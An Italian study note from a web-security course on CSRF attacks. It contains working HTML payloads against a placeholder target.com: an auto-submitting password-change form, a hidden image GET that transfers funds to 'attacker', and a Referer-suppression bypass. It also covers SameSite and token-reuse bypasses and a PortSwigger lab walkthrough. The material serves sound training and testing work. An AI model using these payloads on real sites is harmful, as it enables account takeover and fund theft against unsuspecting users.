# CSRF Attacks

**Difficolta:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [02-Session-Hijacking.md](02-Session-Hijacking.md)
**Lab:** PortSwigger Academy — CSRF

---

## Obiettivo

Costruire richieste malevole che sfruttano l'autenticazione gia attiva della vittima nel suo browser, forzando azioni indesiderate (cambio password, trasferimento fondi, modifica email) senza che la vittima se ne accorga.

---

## Concetti chiave

### Perche funziona

Il browser allega automaticamente i cookie di sessione ad ogni richiesta verso il dominio corrispondente, indipendentemente dal sito che ha originato la richiesta — se l'app non verifica un token anti-CSRF o l'origine della richiesta, non distingue una richiesta legittima da una forzata.

### Difese comuni e come verificarle

| Difesa | Come verificarne l'assenza/debolezza |
|--------|------------------------------------------|
| CSRF token | rimuovi il parametro token, o riusa un token di un'altra sessione |
| Controllo header `Referer`/`Origin` | rimuovi l'header o testa se il controllo e bypassabile |
| `SameSite=Strict/Lax` sul cookie | verifica il flag nel `Set-Cookie` |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp — Generate CSRF PoC | click destro su richiesta > Engagement tools | HTML pronto | genera il form automaticamente |
| Browser | apertura HTML PoC | esecuzione reale | verifica finale |

---

## Payload / Esempi

### Esempio 1: form CSRF per cambio password

```html
<html>
  <body>
    <form action="http://target.com/admin/change_password" method="POST">
      <input type="hidden" name="new_password" value="hacker123">
      <input type="hidden" name="confirm_password" value="hacker123">
      <input type="submit" value="Click here to win a prize">
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
```

**Spiegazione:** l'auto-submit via JS elimina la necessita che la vittima clicchi manualmente; basta che visiti la pagina mentre e loggata sul target.

### Esempio 2: CSRF via GET (piu semplice, se l'endpoint accetta GET per azioni sensibili)

```html
<img src="http://target.com/api/transfer?to=attacker&amount=1000" style="display:none">
```

**Spiegazione:** un endpoint che modifica stato accettando GET e vulnerabile anche solo caricando un'immagine, senza bisogno di form/JS.

### Esempio 3: bypass token CSRF presente ma non legato alla sessione

```
1. Ottieni un CSRF token valido dalla TUA sessione (login come te stesso)
2. Riusa quel token nel form malevolo inviato alla vittima
3. Se il server valida solo "il token esiste ed e valido" senza legarlo alla sessione specifica, l'attacco funziona comunque
```

### Esempio 4: bypass controllo Referer con meta tag

```html
<meta name="referrer" content="no-referrer">
<form action="http://target.com/admin/change_password" method="POST">
  ...
</form>
```

**Spiegazione:** se il server rifiuta solo richieste CON un Referer sbagliato ma accetta quelle senza Referer, sopprimere l'header bypassa il controllo.

---

## Evasion / Bypass Techniques

### Bypass SameSite=Lax con navigazione top-level

`SameSite=Lax` (default in molti browser moderni) blocca richieste cross-site fatte via `fetch`/`form` in iframe, ma **permette** navigazione diretta top-level (click su link, redirect GET). Un endpoint GET sensibile resta sfruttabile anche con `SameSite=Lax`.

### Bypass basato su subdomain (cookie scoping ampio)

Se il cookie e impostato con `Domain=.target.com` (non ristretto al subdomain esatto), un XSS o controllo debole su QUALSIASI subdomain puo condurre CSRF sul dominio principale.

---

## Lab Hands-On

### Lab 1: PortSwigger — CSRF where token validation depends on request method
**Obiettivo:** bypassare validazione token cambiando metodo HTTP
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Osserva che il token e validato solo su POST
2. Ripeti la stessa azione via GET
3. Conferma che l'azione avviene senza validazione token

---

## Common Mistakes

- Testare solo endpoint POST -> molti endpoint GET modificano stato senza che gli sviluppatori se ne accorgano
- Non verificare se il token e legato alla sessione specifica -> un token "valido ma non legato" e comunque exploitabile

---

## Link Utili

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## Connessioni

- **Prerequisito:** [02-Session-Hijacking.md](02-Session-Hijacking.md)
- **Prossimo Step:** [04-IDOR.md](04-IDOR.md)

---

## Checklist di padronanza

- [ ] So costruire un PoC CSRF con auto-submit
- [ ] So testare se un token e legato alla sessione specifica
- [ ] So verificare il flag SameSite e le sue reali limitazioni
- [ ] So usare il generatore CSRF PoC di Burp

---

## Note personali

_(spazio libero)_
